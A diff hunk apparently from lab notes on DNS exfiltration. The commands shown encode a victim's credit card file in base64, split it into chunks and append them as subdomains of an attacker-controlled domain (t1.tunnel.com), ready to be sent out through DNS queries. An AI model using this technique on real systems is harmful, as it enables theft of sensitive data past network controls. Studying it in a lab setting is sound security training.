@@ -44,7 +44,7 @@ On the victim machine, we first encode datas that need to be send, and split it 
 
 ```bash
 # Methode 1
-victim@pwnd.lab$ cat task9/credit.txt | base64 | tr -d "\n"| fold -w18 | sed -r 's/.*/&.t1.tunnel.com/' > toExfiltrate.txt
+victim@pwnd.lab$ cat credit.txt | base64 | tr -d "\n"| fold -w18 | sed -r 's/.*/&.t1.tunnel.com/' > toExfiltrate.txt
 victim@pwnd.lab$ cat toExfiltrate.txt
 TmFtZTogVEhNLXVzZX.t1.tunnel.com
 IKQWRkcmVzczogMTIz.t1.tunnel.com
@@ -56,7 +56,7 @@ ZTogMDUvMDUvMjAyMg.t1.tunnel.com
 pDb2RlOiAxMzM3Cg==.t1.tunnel.com
 
 #Methode 2
-victim@pwnd.lab$ cat task9/credit.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/ > toExfiltrate.txt
+victim@pwnd.lab$ cat credit.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/ > toExfiltrate.txt
 victim@pwnd.lab$ cat toExfiltrate.txt
 TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.t1.tunnel.com
 ```
